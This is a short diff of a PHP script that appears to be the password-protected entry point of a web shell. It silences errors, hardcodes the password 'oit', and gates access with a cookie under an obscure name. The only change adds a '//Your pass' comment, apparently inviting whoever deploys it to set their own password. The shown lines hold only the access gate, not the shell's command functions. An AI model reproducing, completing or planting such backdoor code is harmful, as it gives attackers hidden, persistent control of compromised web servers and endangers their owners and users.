@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-$password='oit';
+$password='oit';//Your pass
 $xyn='psatir';
 if(isset($_POST['pass'])) {if($_POST['pass']==$password) {setcookie($xyn, $_POST['pass'], time()+3600);} let_him_in();}
 if(!empty($password) && !isset($_COOKIE[$xyn]) or ($_COOKIE[$xyn]!=$password)) {initiate(); die();}
